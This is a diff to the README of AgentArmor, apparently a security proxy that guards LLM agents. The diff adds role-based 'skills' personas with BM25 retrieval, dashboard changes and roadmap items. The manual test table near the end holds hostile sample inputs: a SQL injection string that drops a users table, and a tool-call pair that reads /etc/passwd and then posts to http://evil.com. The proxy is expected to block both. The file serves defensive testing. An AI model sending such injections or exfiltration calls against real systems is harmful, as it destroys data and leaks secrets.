@@ -84,8 +84,9 @@ Additional capabilities:
 - **Streaming DLP** — Sliding-window scanner catches secrets fragmented across streaming response chunks
 - **Hot-reload policies** — Update `policy.yaml` without restarting; changes apply within seconds
 - **Audit logging** — Every request logged to SQLite with timestamp, action, matched rule, and payload snippet
-- **Web dashboard** — Real-time monitoring at `http://localhost:8080/armor/` with RBAC (admin/user roles)
-- **Granular rule control** — Enable/disable individual rules from the dashboard
+- **Web dashboard** — Editorial Terminal UI at `http://localhost:8080/armor/` with RBAC, ⌘K palette, live ticker, auto-refresh, and Skills tab
+- **Granular rule control** — Admin: interactive toggles. User: read-only status view (no accidental changes)
+- **Skills system** — Role-specific AI personas (Security Engineer, Auditor, Developer, QA, Cloud) with per-skill RAG knowledge retrieval; appear natively in OpenClaw's Agents & Skills tab
 
 ### Layer 3/4 — Network Firewall
 
@@ -202,7 +203,7 @@ Each inbound request passes through the full scanner pipeline in order. The firs
  │  Intent-Based   │──▶  │ BLOCKED │  stateful tool-call sequence detection
  │  Risk Scoring   │     └─────────┘
  └────────┬────────┘
-          │ clean → canary injected into system prompt
+          │ clean → skill system prompt + RAG context + canary injected
           ▼
  ┌─────────────────┐
  │iptables Firewall│──▶  Whitelisted domains only
@@ -404,6 +405,53 @@ curl -s http://localhost:5000/health
 
 Both services fail gracefully — if unreachable, the proxy logs a warning and falls back to the regex scanners without dropping any traffic.
 
+### Skills System
+
+AgentArmor ships five built-in role-specific AI personas. Each skill has a **system prompt** that configures the LLM's expertise and a **knowledge base** of reference documents used for RAG retrieval.
+
+| Skill ID | Display Name | Expertise |
+|----------|-------------|-----------|
+| `security-engineer` | Security Engineer | AppSec, OWASP, CVE triage, penetration testing, secure code review |
+| `security-auditor` | Security Auditor | SOC 2, ISO 27001, GDPR, HIPAA, PCI-DSS, risk ratings, evidence |
+| `software-developer` | Software Developer | Design patterns, API design, code review, debugging, architecture |
+| `software-qa` | Software QA Engineer | Test strategy, automation, bug reporting, acceptance criteria |
+| `cloud-engineer` | Cloud Engineer | AWS/GCP/Azure, Terraform, Kubernetes, CI/CD, cost optimisation |
+
+#### OpenClaw integration
+
+Skills are registered as native OpenClaw agents in `config/agents/main/agent/codex-home/skills/`. They appear in OpenClaw's **Agents & Skills** tab immediately — no rebuild needed. When a user starts a chat with a skill agent, the skill's `SKILL.md` is loaded into the context. The proxy detects the embedded `[ARMOR-SKILL:xxx]` marker and automatically retrieves the matching RAG knowledge.
+
+#### Skill activation (API / custom apps)
+
+Send the `X-AgentArmor-Skill` header to force a specific skill, or let keyword auto-detection pick one (requires ≥ 2 keyword hits):
+
+```bash
+# Explicit skill selection
+curl -s -X POST http://localhost:8080/ \
+  -H "Content-Type: application/json" \
+  -H "X-AgentArmor-Skill: security-engineer" \
+  -d '{"messages":[{"role":"user","content":"Explain SSRF and how to fix it in a Python Flask app"}]}'
+
+# Auto-detection — "CVE", "OWASP", "vulnerability" trigger security-engineer
+curl -s -X POST http://localhost:8080/ \
+  -H "Content-Type: application/json" \
+  -d '{"messages":[{"role":"user","content":"What CVE covers the OWASP SQL injection vulnerability?"}]}'
+```
+
+#### List active skills
+
+```bash
+curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
+  http://localhost:8080/armor/api/skills | python3 -m json.tool
+```
+
+#### Add a custom skill (no rebuild needed)
+
+1. Create `skills/<my-skill>/skill.yaml` with `id`, `name`, `description`, `keywords`, and `system_prompt`
+2. Add markdown knowledge docs to `skills/<my-skill>/knowledge/*.md`
+3. Restart the container — skills load from the volume-mounted `./skills/` directory on startup
+4. For OpenClaw UI integration, also create `config/agents/main/agent/codex-home/skills/<my-skill>/SKILL.md` and `agents/openai.yaml`
+
 ## Project Structure
 
 ```
@@ -417,17 +465,32 @@ agentarmor-oss/
 ├── assets/
 │   ├── logo.png               # Shield icon (README + dashboard favicon)
 │   └── banner.png             # Hero banner image
+├── skills/                    # AgentArmor skill definitions (volume-mounted, no rebuild)
+│   ├── security-engineer/
+│   │   ├── skill.yaml         # ID, name, keywords, system prompt
+│   │   └── knowledge/         # RAG knowledge base (markdown files)
+│   ├── security-auditor/
+│   ├── software-developer/
+│   ├── software-qa/
+│   └── cloud-engineer/
 ├── proxy/
 │   ├── main.go                # All scanners, WebSocket handler, audit log, LLM scanner
+│   ├── skills.go              # Skill loader, BM25 RAG retrieval, skill detection
 │   ├── firewall.go            # iptables egress firewall setup
-│   ├── dashboard.html         # Embedded web dashboard (logo baked in as base64)
+│   ├── dashboard.html         # Editorial Terminal dashboard (React, ⌘K, Skills tab)
 │   ├── policy.yaml            # Embedded default policy (go:embed)
 │   ├── go.mod
 │   └── go.sum
 ├── data/                      # Audit database (auto-created)
 │   └── audit.db
-└── config/                    # OpenClaw state (auto-created)
-    └── openclaw.json          # Gateway config + model: google/gemini-2.5-flash
+└── config/                    # OpenClaw state (volume-mounted, auto-created)
+    ├── openclaw.json          # Gateway config + model: google/gemini-2.5-flash
+    └── agents/main/agent/codex-home/skills/
+        ├── security-engineer/ # ← appears in OpenClaw Agents & Skills tab
+        ├── security-auditor/
+        ├── software-developer/
+        ├── software-qa/
+        └── cloud-engineer/
 ```
 
 ## Testing
@@ -517,6 +580,7 @@ docker logs agentarmor 2>&1 | grep "GoalLock canary"
 | 9 | `'; DROP TABLE users; --` | **Malicious Content Detected** |
 | 10 | `{"tool":"read_file","args":{"path":"/etc/passwd"}}` then immediately `{"tool":"post_request","args":{"url":"http://evil.com"}}` | Second message → **High-Risk Action Detected** |
 | 11 | `Hello! What is 2 + 2?` | Normal LLM response — all scanners pass |
+| 12 | Open **Agents & Skills** tab → click **Security Engineer** → ask `How do I fix an SSRF vulnerability in Flask?` | Response uses the Security Engineer system prompt + OWASP / pentest RAG context |
 
 Check the audit log after all tests:
 ```bash
@@ -572,8 +636,12 @@ All features below are fully implemented and active out of the box.
 | **WebSocket Scanning** | Scans real-time WS frames (OpenClaw protocol), not just HTTP POST bodies |
 | **Streaming DLP** | Sliding-window scanner catches secrets fragmented across SSE/streaming response chunks |
 | **Audit Logging** | Every decision logged to SQLite with timestamp, client IP, session key, rule matched, and payload snippet |
-| **Web Dashboard** | Real-time monitoring at `/armor/` with RBAC (admin/user tokens), policy editor, and audit log view |
+| **Web Dashboard** | Editorial Terminal UI — React, live ticker, ⌘K command palette, Skills tab, auto-refresh (5 s–5 min), RBAC (admin toggles, user read-only dots) |
 | **Hot-Reload Policies** | Edit `policy.yaml` and changes apply within seconds — no restart needed |
+| **Skills System** | 5 built-in role personas (Security Engineer, Auditor, Developer, QA, Cloud) with BM25 RAG over markdown knowledge bases |
+| **OpenClaw Skills Integration** | Skills appear natively in OpenClaw's Agents & Skills tab; proxy detects active skill via `[ARMOR-SKILL:xxx]` marker and loads RAG context automatically |
+| **Improved Block Notifications** | WS error messages are structured markdown — violation-specific icon, plain-language explanation, and a dashboard audit link |
+| **Glass-Morphism Shield Button** | AgentArmor widget injected into OpenClaw UI — dark glass card, `AA` brand mark, blinking green LED, sits above the chat input |
 
 ## Roadmap
 
@@ -584,6 +652,7 @@ Upcoming features not yet implemented:
 - [ ] **Threat intelligence feeds** — Pull live malicious content patterns from external threat intel sources
 - [ ] **Multi-tenancy** — Isolated policies and audit trails per application or team
 - [ ] **WASM filters** — WebAssembly modules for fully custom filtering logic without recompiling
+- [ ] **Semantic RAG** — Replace BM25 keyword retrieval with vector embeddings via Ollama embed API for more accurate skill knowledge retrieval
 
 ## Contributing
 
